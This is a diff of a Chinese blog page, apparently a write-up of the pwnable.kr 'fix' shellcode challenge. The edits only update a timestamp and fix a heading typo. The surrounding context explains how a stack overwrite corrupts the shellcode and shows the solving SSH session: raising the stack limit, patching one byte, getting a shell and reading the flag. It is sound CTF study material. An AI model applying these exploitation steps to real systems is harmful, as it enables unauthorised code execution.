@@ -107,7 +107,7 @@ Trials1.我第一个想到的是前几天刚见过的po">
 <meta property="og:image" content="http://0byjwzsf.me/images/pwnable.kr-rookiss-fix/3.jpg">
 <meta property="og:image" content="http://0byjwzsf.me/images/pwnable.kr-rookiss-fix/4.jpg">
 <meta property="og:image" content="http://0byjwzsf.me/images/pwnable.kr-rookiss-fix/5.jpg">
-<meta property="og:updated_time" content="2016-08-19T07:34:54.000Z">
+<meta property="og:updated_time" content="2016-08-24T02:53:44.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.kr-rookiss-fix">
 <meta name="twitter:description" content="Conclusion容易发现shellcode存在栈上，而这也是bug所在，因为在shellcode执行过程中，随着栈帧的变化，会覆盖了还没执行完的shellcode
@@ -398,7 +398,7 @@ Trials1.我第一个想到的是前几天刚见过的po">
 <p>不过这题是个本地利用，也就是说我们可以利用<code>ulimit -s unlimited</code>指令来扩大栈的最大大小，这样当<code>esp</code>转移到了<code>0x6e69622f</code>时，会有一个内存访问错误，操作系统会自动把栈进行扩充，也就达到了将<code>esp</code>进行转移的目的，同时被修改的原指令<code>push eax</code>的作用（在栈上填充null）又“顺带”完成了</p>
 <p><img src="/images/pwnable.kr-rookiss-fix/5.jpg" alt=""></p>
 <h1 id="Exp">Exp</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh fix@pwnable.kr -p2222</span><br><span class="line"></span><br><span class="line">fix@ubuntu:~$ <span class="built_in">ulimit</span> <span class="operator">-s</span> unlimited</span><br><span class="line">fix@ubuntu:~$ ./fix</span><br><span class="line">What the hell is wrong with my shellcode??????</span><br><span class="line">I just copied and pasted it from shell-storm.org :(</span><br><span class="line">Can you fix it <span class="keyword">for</span> me?</span><br><span class="line">Tell me the byte index to be fixed : <span class="number">15</span></span><br><span class="line">Tell me the valude to be patched : <span class="number">92</span></span><br><span class="line">get shell</span><br><span class="line">$ ls</span><br><span class="line">fix  fix.c  flag</span><br><span class="line">$ cat flag</span><br><span class="line">Sorry <span class="keyword">for</span> blaming shell-strom.org :) it was my ignorance!</span><br></pre></td></tr></table></figure>
-<h1 id="Referance">Referance</h1><p><a href="https://blog.stypr.com/2015/09/27/pwnable-fix/" target="_blank" rel="external">https://blog.stypr.com/2015/09/27/pwnable-fix/</a></p>
+<h1 id="Reference">Reference</h1><p><a href="https://blog.stypr.com/2015/09/27/pwnable-fix/" target="_blank" rel="external">https://blog.stypr.com/2015/09/27/pwnable-fix/</a></p>
 
       
     </div>
@@ -573,7 +573,7 @@ Trials1.我第一个想到的是前几天刚见过的po">
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trials"><span class="nav-number">1.1.</span> <span class="nav-text">Trials</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exp"><span class="nav-number">2.</span> <span class="nav-text">Exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referance"><span class="nav-number">3.</span> <span class="nav-text">Referance</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trials"><span class="nav-number">1.1.</span> <span class="nav-text">Trials</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exp"><span class="nav-number">2.</span> <span class="nav-text">Exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
           </div>
         </section>
